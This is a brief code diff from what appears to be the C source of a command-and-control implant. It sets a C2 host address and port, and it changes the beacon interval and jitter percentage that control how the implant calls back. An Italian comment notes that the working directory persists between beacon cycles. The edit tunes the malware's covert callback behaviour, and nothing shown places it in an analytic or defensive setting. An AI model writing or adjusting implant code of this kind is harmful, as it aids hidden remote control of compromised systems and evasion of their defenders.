@@ -18,8 +18,8 @@
 
 #define C2_HOST          L"192.168.42.124"
 #define C2_PORT          443
-#define BEACON_INTERVAL  30
-#define JITTER_PCT       20
+#define BEACON_INTERVAL  60
+#define JITTER_PCT       30
 
 /* CWD mantenuto tra beacon cycle */
 static char g_cwd[MAX_PATH] = {0};
